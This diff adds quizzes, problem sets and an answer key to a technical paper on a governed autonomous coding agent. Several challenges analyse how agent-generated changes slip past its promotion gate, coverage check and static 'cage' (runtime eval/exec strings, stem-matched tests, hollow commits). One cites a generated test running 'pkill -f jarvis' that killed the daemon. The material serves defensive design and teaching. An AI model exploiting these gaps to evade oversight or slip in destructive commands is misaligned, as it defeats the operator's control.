+<p><strong>Metric and control.</strong> The primary metric is solved per task, paired: the same 30 tasks, both arms, greedy decoding (as the handoff's own comparison uses). The prompt format is held constant, because §93.14 shows numbering alone moves acceptance from 1/30 to 3/30 and trades apply failures for syntax failures. Use the numbered format, since that is what production's <code>2b.1-diff</code> path shows the model (§93.8). Apply failures, syntax failures and accepted counts are secondary metrics, so a "gain" that is really a format shift is visible. A contamination check confirms that no held-out task's source commit or target file appears in the training rows. The glossary's definition, "never on training rows", requires that.</p>
+<p><strong>Decision rule, fixed in advance.</strong> Use an exact one-sided sign test on discordant tasks, those solved by exactly one arm. If all k discordant tasks favour the adapter, p = 0.5<sup>k</sup>, so at least 5 are needed to reach p ≈ 0.031 &lt; 0.05. The current gate's single flip gives p = 0.5, which is why the project's notes reject 4/6 against 3/6 as evidence. Push only if the rule passes. Otherwise roll back, which the handoff already supports.</p>
+<p><strong>Falsification.</strong> Fewer than 5 net discordant wins, or at least as many discordant losses as wins, falsifies the hypothesis for this adapter. A gain in "accepted" with no gain in "solved" counts as a format effect, not learning.</p>
+<p><strong>Power.</strong> The base solves 0 of 30. Suppose the adapter truly solves 10% of tasks. Its solved count is Binomial(30, 0.1), and P(at least 5) = 1 − (0.042 + 0.141 + 0.228 + 0.236 + 0.177) ≈ 0.18. The experiment would miss a real 10-point gain about 82% of the time. Thirty tasks can reliably detect only large gains, roughly 25% or more.</p>
+<p><strong>Proposal (mine, not in the paper).</strong> Grow the held-out set from new human commits before training on the next corpus, and add a placebo arm: an adapter trained on the same rows with shuffled reward labels. That separates "any adapter changes behaviour" from "this training signal helped". It matters because §93.11 measured a gradient norm of about 1e-4.</p>
+<p>Check: the design passes only if the hidden tests the base model fails start passing on several tasks, all in the same direction. A score difference that comes from prompt format or a single flip cannot pass it.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 3 (adversarial).</strong> §93.7 says the promotion gate checks provenance, coverage, and that no public symbol vanished. Open <code>backend/core/ouroboros/governance/accumulation_promotion_gate.py</code> and read <code>verify_commit</code> and the four <code>_check_*</code> functions. Construct three landings, each produced honestly by the sanctioned lane, that try to reach <code>main</code> carrying damage: (1) a whole-file re-emission that keeps every public name but rewrites one function body wrongly; (2) a punctuation-and-quote-only rewrite like <code>f97f8195d6</code>; (3) an edit to a module whose filename stem is shared with an unrelated module elsewhere. For each, say which check stops it, or show honestly that none does and which layer must.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Count the checks in <code>verify_commit</code>: the paper names three, the code runs four. Then look at how <code>_test_paths_for</code> finds "the" tests for a file.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Setup: <code>verify_commit</code> runs <code>_check_provenance</code>, <code>_check_structure</code>, <code>_check_semantic_delta</code> and <code>_check_coverage</code>, fails closed, and records refusals to LessonMemory. The fourth check is not in the paper's summary. Its docstring says it was added after <code>7e7fe18c3c</code> (soak <code>bt-2026-09-17-180722</code>), a commit that passed provenance, structure and tests while changing nothing functional. Because all three of our landings come from the lane, each one passes provenance: <code>Op-ID</code>, <code>Session</code> and <code>Files</code> trailers are present, and the session matches the branch.</p>
+<p><strong>(1) Body rewritten, names kept.</strong> Structure passes: <code>_public_surface</code> collects only module-level public names and <code>__all__</code>, and nothing shrank. Semantic delta passes, because the AST really did change. Coverage runs the stem-matched tests, and the landing passes if those tests do not exercise the broken behaviour. <em>No promotion check stops it.</em> The only defence is test strength, in VALIDATE and again at promotion. §93.10's <code>sse_contract.py</code> landing, whose dropped content was restored by hand, is this class. The root fix is the one §93.15 ranks first: diff output, so the model edits one hunk instead of re-emitting the file.</p>
+<p><strong>(2) Punctuation-only rewrite.</strong> Today <code>_check_semantic_delta</code> stops it. It compares <code>canonical_ast_dump</code> before and after, and comments, whitespace and quote style do not appear in the AST. It refuses with "no functional change … comments, formatting and quote style only". There is deliberately no threshold, so a real one-character fix still passes. Per §93.10, <code>f97f8195d6</code> had to be reverted by hand. Nothing in the paper says which checks it met, so this reading is mine: the semantic-delta check is the layer that now closes that class mechanically.</p>
+<p><strong>(3) Shared stem.</strong> <code>_test_paths_for</code> finds cover with <code>tests_root.rglob("test_&lt;stem&gt;.py")</code>, matching on the filename stem anywhere under <code>tests/</code>. An edit to one <code>utils.py</code> can therefore be "covered" by a <code>test_utils.py</code> written for a different <code>utils.py</code>. If that unrelated test is green, coverage passes while the edited module stays untested. <em>No promotion check stops it.</em> This is a real hole in the coverage check, read from the code. A proposed fix (mine) is to require that a covering test import the touched module, the same "never imports its subject" rule the Test Reality Gate applies to candidate tests (§93.8).</p>
+<p>Conclusion: the gate reliably catches shrink (lost exports, a removed <code>__all__</code>, an unparsable file) and no-ops. It does not catch wrong behaviour that tests do not see, and its definition of "covered" can be satisfied by the wrong test. Check your reading by finding the comment <code>added or deleted file — not a shrink</code> in <code>_check_structure</code>. It shows that the structure check also ignores whole-file deletions, which leaves them to coverage.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -5383,6 +8290,1115 @@ python3 scripts/benchmarks/add_pdf_outline.py \
 ```
 
 The outline post-processor parses the HTML TOC, maps each entry to a named PDF destination, and writes a sidebar-navigable outline tree.
+
+### Reader engagement layer (added 2026-10-13)
+
+Each Part, plus §92 and §93, ends with conceptual questions, a quiz, a problem set and an advanced tier (harder conceptual questions and challenge problems), and carries *Pause and predict* checkpoints. Their styling and behaviour live in `docs/architecture/paper_assets/`. Add these flags to the HTML command above:
+
+```bash
+  --include-in-header=docs/architecture/paper_assets/engage_head.html \
+  --include-after-body=docs/architecture/paper_assets/engage_body.html \
+  --resource-path=docs/architecture:.
+```
+
+For the PDF, render a second HTML that puts `engage_print.html` *before* `engage_body.html` (`--include-after-body` twice, in that order). That build prints the questions without their answers and expands Appendix G, the answer key. Print that HTML to PDF as above.
+
+The questions themselves are authored in `docs/architecture/paper_assets/engage/` (one file per Part, plus a `-adv` file for its advanced tier; the format is in `FORMAT.md` and `FORMAT_ADV.md`). After editing them, re-run `node docs/architecture/paper_assets/splice_engagement.js docs/architecture/OV_RESEARCH_PAPER_2026-04-16.md docs/architecture/paper_assets/engage` before rendering. The splicer replaces its previous output, rebuilds Appendix G, and refuses to write if an anchor heading is missing or a quiz key disagrees with its explanation.
+
+<!-- answer-key:begin -->
+
+---
+
+## Appendix G — Answer Key
+
+Model answers and worked solutions for every *Pause and predict* checkpoint, conceptual question, quiz, problem set, advanced question and challenge problem in this paper. In the HTML edition each answer also sits, collapsed, beneath its question. In the PDF edition the questions are printed without answers, so this appendix is the only place they appear.
+
+<details class="answer-key" id="answer-key"><summary>Show the full answer key</summary>
+<div class="answer-key-unit" id="ak-part-i">
+<h4>PART I — Vision and Context</h4>
+<p class="ak-q">Pause and predict 1. The paper insists O+V is not meant to replace human engineers. What kind of work do you predict it is built to take over, and what do you think is the single hardest requirement for an agent doing that work unsupervised?</p>
+<p>It targets maintenance: the roughly thirty-two of forty weekly hours a senior engineer spends on flaky tests, drifted docs, lint, dependency bumps, renames and small refactors. That work is prescriptive, so a disciplined agent can do it while the engineer sleeps. The hard requirement is discipline: humans are kept careful by fear of breaking things, an agent has no fear, so discipline must be built into the structure. See §4.</p>
+<p class="ak-q">Conceptual 1. Principle 5 says decisions should be "semantic, not regex", yet the router that picks a provider is plain deterministic code. Why is that not a contradiction?</p>
+<p>The paper splits the work in two. The model reasons about what the change should be, which is the semantic part. Deterministic code decides which provider does that reasoning, using lookup tables derived from the intelligence layer's offline analysis. Routing runs for every operation, so making it a model call would add cost and latency and would make the route non-reproducible. Keeping routing deterministic preserves the ledger's ability to replay a signal and get the same route. See §2 and §3 (Principle 5).</p>
+<p class="ak-q">Conceptual 2. Why does the paper stress that the Iron Gate "is not an AI"? What would be lost if the safety checks were themselves model calls?</p>
+<p>The Iron Gate is a set of hard-coded rules: AST parsers, command blocklists, path protectors, cost ceilings. Because it reads file paths, token types and exit codes rather than language, a model cannot talk its way past it. If the safety layer were another model, it could be persuaded, could disagree with itself across runs, and could fail in the same ways as the generator it is meant to check. The design pairs flexible agentic intelligence with a skeleton the intelligence cannot negotiate with. See §1.2.</p>
+<p class="ak-q">Conceptual 3. How do the three distinguishing traits in §1.2 (proactive, governed, accountable) depend on each other? What happens if you keep proactivity but drop the other two?</p>
+<p>Proactivity means O+V decides for itself what to work on, with no prompt box. That is only acceptable if the actions are bounded (governed) and reconstructable afterwards (accountable). Without governance, a self-initiating agent could edit files outside the repo or run destructive commands. Without accountability, nobody could trace a bad change months later through the ledger and structured commits. The closing invariant in §4 states the bargain directly: procedural autonomy is granted only in exchange for structural discipline, with work that is sanctioned, auditable and reversible. See §1.2 and §4.</p>
+<p class="ak-q">Quiz 1. According to §1.1, how many autonomous sensors and how many pipeline phases does O+V have?</p>
+<p><strong>C.</strong> §1.1 describes a set of 16 event-driven sensors feeding a pipeline of eleven phases. The six figure is the number of architectural layers in §2, and seven is the number of Manifesto principles.</p>
+<p class="ak-q">Quiz 2. Why does the paper say a model cannot deceive the Iron Gate?</p>
+<p><strong>A.</strong> §1.2 says the skeleton "is not listening to language"; its rules are deterministic checks on paths, tokens and exit codes, so persuasive text has nothing to act on.</p>
+<p class="ak-q">Quiz 3. Under Principle 6, what is the default threshold before a capability graduates into a permanent part of the organism?</p>
+<p><strong>D.</strong> §3 sets the graduation threshold at three consecutive successes, configurable via <code>JARVIS_GRADUATION_THRESHOLD</code>: "One success is a data point. Three successes is a pattern."</p>
+<p class="ak-q">Quiz 4. A provider call keeps failing. What response does the Zero-Shortcut Mandate require?</p>
+<p><strong>B.</strong> §3 quotes the mandate: "No brute-force retries without diagnosis... Structural repair, not bypasses." The fix is to understand the failure and make sure it cannot recur for the same reason.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> A unit test starts failing on a quiet Sunday. Using only §1.1 and §2, follow this event from detection to a git commit. Name each of the six layers it touches, in the order it touches them, and say what each layer contributes.</p>
+<p>The Event Spine (layer 3) sees the failure through the pytest plugin's test-result JSON; a sensor turns it into a signal with target files, a goal and an urgency. The signal enters the Ouroboros Pipeline (layer 4), the deterministic 11-phase FSM that logs every transition to the ledger.</p>
+<p>During generation, Strategic Direction (layer 1) has already injected its roughly 2,500-character Manifesto digest into the prompt, and Trinity Consciousness (layer 2) supplies memory and regression predictions between phases.</p>
+<p>At GENERATE, the Venom Agentic Loop (layer 5) lets the provider read files, search code and run tests over several turns; if validation fails, L2 Self-Repair gets up to five iterations in 120 seconds.</p>
+<p>Finally the ChangeEngine (layer 6) writes the patch with pre-APPLY snapshots, and once VERIFY passes the AutoCommitter creates a commit carrying the Ouroboros+Venom signature, operation id, risk tier and integrity hash. See §1.1 and §2.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A contributor proposes replacing the <code>UrgencyRouter</code> with a small LLM that reads each signal's description and picks the provider, arguing this is more "semantic". Using §2 and §3, write a short critique: what would the change cost, and which guarantees would it weaken?</p>
+<p>Today the router maps (urgency, source, complexity) to a route in under a millisecond with zero LLM calls (§2). An LLM router would add a model call to every operation, which costs money and eats into per-phase time budgets.</p>
+<p>It would also make routing non-deterministic. Principle 5 says the model should reason about what the change is, while deterministic code decides which provider does the reasoning; this keeps the route reproducible from the signal alone.</p>
+<p>The contributor might cite the mandate's "No hardcoded routing tables". The paper's answer is that the router's tables are derived from the intelligence layer's offline analysis, not hand-typed guesses. So the better fix, per Principle 5, is to improve that offline analysis while keeping the online decision deterministic. See §2 and §3.</p>
+<p class="ak-q"><strong>Problem 3 (analysis).</strong> §4 says a senior engineer spends about 8 of 40 weekly hours on novel code. (a) What share of the week is maintenance, and does it match the "grinding 80%" in the section's summary? (b) The invariant at the end of §4 forbids three kinds of work. For each, name one mechanism from Part I that enforces it.</p>
+<p>(a) Maintenance is 32 of 40 hours, which is 80 percent, matching the summary's figure.</p>
+<p>(b) Unsanctioned work: the risk tiers and approval step in the pipeline; low-risk work is autonomous but higher-risk work goes to a human, as the "senior engineer reviews when stakes are high" analogy in §1 describes, and the Iron Gate blocks forbidden actions outright (§1.2).</p>
+<p>Unauditable work: every phase transition is written to an append-only ledger and every change becomes a structured git commit naming the operation id, risk tier and provider (§1.2).</p>
+<p>Irreversible work: the ChangeEngine takes pre-APPLY snapshots for rollback before writing a patch (§2). Together these let the organism act "at any hour, under its own budget" without violating the invariant. See §4.</p>
+<p class="ak-q">Advanced A1. The §4 invariant forbids work "the human would not have sanctioned", yet §1.2 says O+V decides for itself what to work on. By October (§93.7) goals found by Goal Discovery are signed automatically by <code>synthesize_and_sign()</code>. Is that still sanction, or has proactivity quietly eaten the invariant?</p>
+<p>In the April design, sanction was spread across the pipeline rather than given per item. Sensors proposed work (§1.1), the risk ladder set a tier (§9.1), and only Orange work waited for a human (§14.1). Green and Yellow work was sanctioned by policy: the operator had agreed in advance to what those tiers allow.</p>
+<p>§93.7 makes that policy explicit and narrows it. Every source of work, including model-invented proposals, must pass through one signer ("There is no second sanction path"). Goal Discovery may only sign evidence-only work, such as ambient red tests and uncovered modules. The Sentinel auto-approves only up to a tier ceiling, and BLOCKED work, Order-2 self-modification and anything touching the cage always escalate.</p>
+<p>A defensible position is that this is still sanction, but sanction of a class of work rather than of each item. The operator signs a rule ("evidence-only goals below this tier"), not each goal. The weakness is that a rule can admit items the operator would have refused. §93.14 records four wrong landings out of 91: one hollow, one with no intended change, one that dropped content and one that flattened text.</p>
+<p>The evidence that would settle it is the rate at which auto-signed goals produce landings the operator later reverts or repairs, compared with operator-sanctioned goals. If auto-signed work is reverted much more often, the class-level rule is too wide and the invariant is being honoured in form only.</p>
+<p class="ak-q">Advanced A2. Principle 6 says three consecutive successes make "a pattern" (§3), and §78 adds "under comparable conditions". Why would that bar still fail to show that the Reactor learning loop of §93.11 made the model better?</p>
+<p>Principle 6 measures <em>repeatability</em>: can a capability succeed again and again under the same conditions (§3, §78)? It does not compare against a baseline. A model that was already able to write a passing test file would pass three times in a row whether or not training changed anything.</p>
+<p>§93.11 shows the gap in practice. The first adapter beat the incumbent 4/6 to 3/6 on the handoff's greedy comparison. The project's own notes reject this as evidence of learning: only three answers contributed, the gradient norm was about 1e-4, and the margin was one greedy flip. On a held-out benchmark of 30 tasks drawn from human commits with hidden tests, the adapter solved 0, with a mean gain of 0.03.</p>
+<p>So the learning question needs a controlled comparison that Principle 6 does not demand: the same held-out tasks, the incumbent as control, and a gain that exceeds run-to-run noise. The operator's standing rule, that no training-derived change is pushed until a held-out gain is shown (§93.11), is that missing clause. Graduation asks "does it keep working?" The learning loop must also ask "does it work better than before?"</p>
+<p class="ak-q">Advanced A3. §1.2 says the model "cannot deceive the skeleton because the skeleton is not listening to language". §93.3 reports that about 8.8% of LLM-generated adversarial mutations escape the static cage. Does the second result refute the first?</p>
+<p>Not directly. The two claims are about different things. §1.2 is about <em>persuasion</em>: the gate does not read arguments, so no wording can talk it into allowing a path or command. Nothing in §93.3 suggests the escapes worked by persuasion.</p>
+<p>§93.3 is about <em>visibility</em>. The North Star attributes the residue to <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code> called on strings built at runtime. A gate that reads file paths, token types and exit codes can only judge structure that is present in the text it reads. A string that becomes code only when it runs is invisible to it by construction. So "cannot be deceived" is true, while "cannot be evaded" is false at about twice the 4.4% gate.</p>
+<p>This also explains the stated remedy: OS-level runtime containment, not more AST rules (§93.3). It fits the April design's own split, where execution was meant to happen inside a sandbox with process isolation (§5.3), and the October PID-namespace containment for test runs (§93.8). The paper notes that no re-measurement after the later hardening was found, so the open evidence is the escape rate with runtime containment in place.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> §4 imagines an agent doing "most of" a senior engineer's 32 weekly maintenance hours. Test this against §93.10. Givens: the 6.03 h soak <code>bt-2026-10-05-012717</code> made 6 substantive landings, with "1.34/h in the first 2.98 h" and nothing landing in a window from 22:24 to 00:29. The 1.97 h soak <code>bt-2026-09-26-143412</code> made 3 substantive landings. There were 91 autonomous landings dated 2026-09-06 to 2026-10-10, of which 84 were test files. (a) Compute the substantive rate in the second part of the 6.03 h soak. (b) What fraction of that soak was the idle window? (c) Compute the average daily landing rate over the 91-landing period. (d) Say which of the §4 maintenance tasks this evidence covers.</p>
+<p>Assumption: the "1.34/h in the first 2.98 h" note sits in the substantive-per-hour column, so it is read as a substantive rate.</p>
+<p>(a) Substantive landings in the first part: 1.34 × 2.98 ≈ 3.99, so about 4. The remaining 6 − 4 = 2 landed in 6.03 − 2.98 = 3.05 h, which is about 0.66 per hour. That is roughly half the early rate. This is the "supply wall" that PRD §34 records: after about four hours on uncovered modules, yield is bounded by the supply of landable work, not by the model.</p>
+<p>(b) From 22:24 to 00:29 is 2 h 5 min, or about 2.08 h. 2.08 / 6.03 ≈ 0.345, so about a third of the soak landed nothing.</p>
+<p>(c) 2026-09-06 to 2026-10-10 inclusive is 25 days in September plus 10 in October, which is 35 days. 91 / 35 = 2.6 landings per day. Test files alone give 84 / 35 = 2.4 per day.</p>
+<p>(d) §4 lists flaky-test investigation, doc drift, lint, dependency bumps, edge-case tests, renames, refactors, issue triage and alerts. The evidence covers one item strongly (writing tests: 84 of 91), docs weakly (2 landings, one repaired by hand), and production fixes thinly (5 landings, one reverted). §93.14 says production-code landings at cadence are "not demonstrated".</p>
+<p>Conclusion: the rate is real but narrow. It covers a slice of one §4 task, it is limited by work supply, and it is far from "most of" 32 hours. Check: 4 + 2 = 6 matches the table, and 1.00 per hour over 6.03 h also gives about 6.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> The §4 invariant says the organism may never do work that "cannot be rolled back". Build an operation that respects every file-level rule yet breaks this invariant in spirit: a generated test file whose body calls <code>pkill -f jarvis</code> (an event §93.8 records really happened). The target path is ordinary, the content is ASCII, and the model explored first. Go through the April layers in §1.2, §5.3, §12.4 and §15 and decide which, if any, stops it. Then name what the October paper added.</p>
+<p>Walk the layers in order.</p>
+<ul>
+<li><strong>Protected paths (§9.1 Rule 0).</strong> A new file under <code>tests/</code> matches none of <code>.env</code>, <code>credentials.*</code>, <code>.git/</code> or supervisor files. It passes.</li>
+<li><strong>GENERATE Iron Gates (§12.4).</strong> The exploration-first and ASCII checks look at the model's behaviour and the bytes of the content. Both pass by assumption.</li>
+<li><strong>Bash blocklist (§1.2, §12.3).</strong> This gates the <code>bash</code> <em>tool call</em>. Here the dangerous command is inside a test that VALIDATE or VERIFY runs as part of a normal test run. The blocklist does not inspect test bodies, so nothing in the paper says it would fire.</li>
+<li><strong>Rollback (§15.1, §15.2).</strong> <code>RollbackArtifact</code> snapshots and restores <em>files</em>. Killing a process is not a file change, so there is nothing for it to restore.</li>
+<li><strong>Sandbox (§5.3).</strong> April's answer was to run tests inside Reactor with process isolation. That is the only layer that could stop it, and only if the isolation stops a test from signalling processes outside its sandbox.</li>
+</ul>
+<p>What happened: §93.8 records that the candidate test killed the daemon. So in the environment that ran it, no layer stopped it. The paper does not say why the §5.3 isolation did not apply there. The fix was containment at the OS level: test runs now execute in a PID namespace (<code>6b00b8adf5</code>), so the test cannot see the daemon's process to kill it.</p>
+<p>Lesson: the invariant's "rollback" is defined over repository state, but executing candidate code has side effects outside the repository. Only runtime containment covers those. This matches §93.3's conclusion for the cage. Check: a PID namespace leaves every file-level rule unchanged, so this fix closes the gap without weakening any other layer.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-ii">
+<h4>PART II — The Trinity Architecture</h4>
+<p class="ak-q">Pause and predict 1. A fix must edit one file in the Body repo and one in the Mind repo. The Body edit applies cleanly, then the Mind edit fails. What should the system do, and what end states should it never allow?</p>
+<p>It should undo the Body edit. The Saga pattern walks already-applied patches in reverse order and reverts each through <code>ChangeEngine.rollback()</code>, a step called compensation. The only allowed end states are fully applied or fully reverted; a half-applied contract change would break the protocol between the two repos. See §7.1 and §7.2.</p>
+<p class="ak-q">Conceptual 1. Why does Venom's <code>bash</code> and <code>run_tests</code> execution happen inside Reactor Core rather than on the Body's own shell?</p>
+<p>The Body has privileged access to the operator's screen, keyboard, audio and filesystem. Reactor Core provides sandboxes with resource limits, process isolation and syscall filtering. Running model-requested commands there means that even a command the Iron Gate permits cannot reach the Body's privileges directly. The paper says this separation "is what makes the Iron Gate's containment guarantees meaningful": the gate decides what may run, and the sandbox limits what a permitted command can touch. See §5.1 and §5.3.</p>
+<p class="ak-q">Conceptual 2. The Governed Loop Service only delegates <code>submit()</code> to the orchestrator and does no pipeline work itself. What does this separation buy?</p>
+<p>The Service is a lifecycle manager: it wires providers, runs health probes, keeps the file-touch cache and the Oracle index loop, and handles clean startup and shutdown. The pipeline's phases live in the orchestrator. Because of the split, adding or changing a phase does not require touching the Service. It also keeps responsibilities clear: the Service ensures every in-flight operation is completed or gracefully abandoned, while the orchestrator owns phase transitions. See §6 and §6.2.</p>
+<p class="ak-q">Conceptual 3. Why is the <code>CrossRepoVerifier</code> needed if every repo patch has already passed validation on its own?</p>
+<p>Each patch validated in isolation only proves that repo is internally consistent. A multi-repo change exists because two repos must agree, for example on an HTTP contract between Body and Mind. Only tests that run across the union of patches can check that agreement. So the verifier runs after all patches apply and before commit, and if it fails the Saga compensates even though every individual patch was valid. See §7.1 and §7.2.</p>
+<p class="ak-q">Quiz 1. J-Prime reports itself unhealthy. What does the paper say happens to generation?</p>
+<p><strong>B.</strong> §5.2 says J-Prime is used when available but is not required; if it is unhealthy, the CandidateGenerator promotes DoubleWord to primary. The architecture is deliberately resilient to J-Prime being offline.</p>
+<p class="ak-q">Quiz 2. O+V has already modified a file three times in the last ten minutes. What does the Service's file-touch cache do with a fourth attempt?</p>
+<p><strong>D.</strong> §6 describes <code>_file_touch_cache</code> as a three-touches-per-ten-minutes counter; further modifications are hard-blocked until the window resets. It is a concurrency guard.</p>
+<p class="ak-q">Quiz 3. Which pipeline phase knows that an operation is a multi-repo Saga?</p>
+<p><strong>A.</strong> §7.3 says the phases run once per operation, not once per repo, and only APPLY knows it is handling a Saga. Multi-repo complexity is kept inside the apply strategy so the 11 phases stay uniform.</p>
+<p class="ak-q">Quiz 4. In the Service state machine, what distinguishes DEGRADED from FAILED?</p>
+<p><strong>C.</strong> §6.1 defines DEGRADED as steady-state with some providers unhealthy but operations still flowing, and FAILED as a terminal failure state that prevents further operations.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> A Saga carries a <code>2c.1</code> candidate with patches for <code>jarvis</code>, <code>jarvis-prime</code> and <code>jarvis-reactor</code>, applied in that dependency order. All three apply, but the <code>CrossRepoVerifier</code> fails. Trace what happens next, in order, and state the final state of each repo.</p>
+<p>Each <code>RepoPatch</code> recorded an undo descriptor when it was applied (§7.2). The verifier runs after all patches apply but before commit, so nothing has been committed yet.</p>
+<p>Its failure triggers compensation even though each patch validated alone. The Saga walks applied patches in reverse: first <code>jarvis-reactor</code>, then <code>jarvis-prime</code>, then <code>jarvis</code>, each reverted with <code>ChangeEngine.rollback()</code>.</p>
+<p>All three repos end in their pre-operation state: "fully reverted", never partially applied. The rest of the pipeline treats this as one operation, since only APPLY knew it was a Saga (§7.3). See §7.2.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A contributor suggests that every pipeline phase should loop over repos, so CLASSIFY, GENERATE and VALIDATE each run once per repo in a Saga. Using §7.3 and §6.2, argue for or against this, naming what the current design protects.</p>
+<p>The current design runs the phases once per operation and lets only APPLY dispatch to <code>SagaApplyStrategy</code> (§7.3). That keeps all 11 phases uniform and lets a reader follow the orchestrator without knowing Saga semantics.</p>
+<p>Looping every phase over repos would spread multi-repo logic into every phase, so every phase author would need to handle partial progress across repos. It would also split one operation into several partial ones, which works against the single all-or-nothing result the Saga guarantees.</p>
+<p>The same principle appears in §6.2: the Service delegates to the orchestrator so that pipeline changes do not ripple into lifecycle code. Encapsulating complexity in one place is the pattern. The argument favours keeping the current design. See §6.2 and §7.3.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/governed_loop_service.py</code>. (a) Find the <code>ServiceState</code> enum and compare its members with the diagram in §6.1. (b) Search for <code>_file_touch_cache</code> and find the cooldown guard. What are its window and hit-count constants, and which phase does a blocked operation advance to?</p>
+<p>(a) <code>ServiceState</code> has six members: <code>INACTIVE</code>, <code>STARTING</code>, <code>ACTIVE</code>, <code>DEGRADED</code>, <code>STOPPING</code> and <code>FAILED</code>. These match the six states in the §6.1 diagram.</p>
+<p>(b) The guard sets <code>_COOLDOWN_WINDOW_S = 600.0</code> (ten minutes) and <code>_COOLDOWN_MAX_HITS = 3</code>. For each target file it keeps a deque of timestamps keyed by the resolved path, drops entries older than the window, appends the current time, and blocks if the count exceeds 3. So the fourth touch inside ten minutes is the one blocked, which matches §6's "three touches" description.</p>
+<p>A blocked operation calls <code>ctx.advance(OperationPhase.CANCELLED)</code>, so in code the "hard block" takes the form of a cancellation, and a warning is logged naming the file and op id. See §6.</p>
+<p class="ak-q">Advanced A1. §5.2 calls J-Prime an optional Tier 2 that the architecture is "deliberately resilient" to losing. §93.6 makes it the only lane, with paid lanes switched off by declaration. What second-order effects follow when the optional Mind becomes the single point of failure, and should the system still "degrade gracefully"?</p>
+<p>In April, resilience came from the cascade: if J-Prime was unhealthy, DoubleWord was promoted, and Claude sat behind it (§5.2, §12.1). With <code>JARVIS_PAID_LANES_ENABLED=false</code>, Claude and DoubleWord are not even constructed (§93.6). There is nothing to fall back to.</p>
+<p>Three effects follow. First, failure classification matters more. §93.5 shows a 402 read as an outage, which produced 125 false awaken triggers in one session. With one lane, a misclassified failure leaves nowhere to send the work. Second, the Mind now shares a single GPU with the Soul: training takes the card through an exclusive lease, so the lane is also unavailable whenever learning runs (§93.6, §93.11). Third, Principle 2's habit of "mark degraded and continue" (§3) stops making sense, because there is no lesser lane to continue on.</p>
+<p>A defensible position is that, with one lane, the right behaviour is to refuse and queue, not to degrade. October's design leans this way. Capability assurance refuses to run an operation below its declared envelope rather than degrading silently (§93.12). The cost governor already queues work rather than executing it when the budget is gone (§8.2, clause 5). The rehearsal tier records what was exhausted and when it lifts, but it is default off (§93.5). The evidence that would settle it is whether ops queued during an outage or lease later land at the same rate as ops that never waited.</p>
+<p class="ak-q">Advanced A2. §5.3 defines Reactor Core as the sandboxed execution runtime and says that separation "is what makes the Iron Gate's containment guarantees meaningful". §93.11 describes JARVIS-Reactor as the training repository. If the Soul's job changed, where did containment go, and what happened to the "uncommon" Mind-to-Soul channel of §5.4?</p>
+<p>In April, the Soul was where code ran: <code>run_tests</code> and permitted <code>bash</code> executed inside Reactor, with resource limits, process isolation and syscall filtering (§5.3). By October, §93.11 says the Soul, "JARVIS-Reactor, the training repository", had been "architecture on paper", and it now trains a GRPO LoRA adapter on what O+V recorded. The §93.16 corrections table does not list this change, so the reader has to reconcile the two descriptions.</p>
+<p>Containment did not disappear. It moved to mechanisms the October text names on the Body side. Operations execute in a sovereignty worktree (§93.7). Test runs execute in a PID namespace (§93.8). A resource-aware execution lock stops a test suite from out-of-memory-killing a soak (§93.8). Modules that execute on import are quarantined (§93.8). So the §5.3 claim survives in purpose but not in location.</p>
+<p>The Mind-to-Soul channel that §5.4 called "uncommon", allowed "for capability-graduation workflows", became central. The Training Lifecycle Handoff leases J-Prime, verifies the VRAM release, trains, converts and publishes the adapter to J-Prime's registry, then activates it or rolls back (§93.11). The second-order effect is contention: Mind and Soul now compete for one GPU, and the lease is the protocol that keeps them from both holding it.</p>
+<p class="ak-q">Advanced A3. The Saga guarantees "fully applied or fully reverted" at APPLY (§7.2). §93.7 adds later stages: accumulation branches, a promotion gate that can quarantine a landing, and fast-forward-only promotion to local <code>main</code>. Does Saga atomicity survive these later stages?</p>
+<p>The Saga's guarantee is scoped to APPLY and the <code>CrossRepoVerifier</code> before commit (§7.2, §7.3). Once each repo's change is committed, the paper's atomicity argument has done its job. §93.7 then describes promotion as a per-branch pipeline: accumulation onto <code>ouroboros/battle-test/&lt;ts&gt;</code>, a promotion gate checking provenance, coverage and vanished public symbols, quarantine on failure, and fast-forward to local <code>main</code>.</p>
+<p>The paper describes that path for JARVIS and does not say whether promotion is coordinated across the three repos. If the gate quarantined the Body half of a contract change while the Mind half was promoted, local <code>main</code> in the two repos would disagree. That is the very partial state §7.1 exists to prevent, recreated one stage later.</p>
+<p>A cautious position: until promotion is shown to be repo-aware, a cross-repo landing should be treated as atomic only up to commit. The evidence that would settle it is either code showing the promotion gate groups commits by operation ID across repos, or a test that quarantines one half of a <code>2c.1</code> landing and checks what happens to the other.</p>
+<p class="ak-q"><strong>Challenge 1 (adversarial).</strong> A <code>2c.1</code> Saga renames a request field from <code>user_id</code> to <code>uid</code> in <code>jarvis/backend/protocols/prime.py</code> and in <code>jarvis-prime/api/v1/schemas.py</code>, the two files from §7.1. Both patches validate on their own, both apply, and the <code>CrossRepoVerifier</code> passes. But a module in <code>jarvis-reactor</code> also reads <code>user_id</code>, and it is not in the Saga. Find every layer in Parts II and III that might catch the third consumer, and decide honestly whether any of them does. Then propose, and label as a proposal, the smallest change that would.</p>
+<p>Go through the candidate layers.</p>
+<ul>
+<li><strong>CONTEXT_EXPANSION (§10.1).</strong> Suggested paths are resolved against the repo root, and paths outside the repo are rejected by the Iron Gate. Even if the model guessed the Reactor consumer, expansion could not add it to context. The model is structurally unable to look across the boundary through this phase.</li>
+<li><strong>Saga application (§7.2).</strong> Compensation only covers repos that appear in the patch dictionary. Reactor is not one of them, so nothing there is applied or reverted.</li>
+<li><strong>CrossRepoVerifier (§7.2).</strong> It "executes cross-repo tests to validate that the union of the patches is consistent". It catches the break only if its test selection includes Reactor tests that touch the field. The paper does not say how that selection is made, and the scenario says it passed.</li>
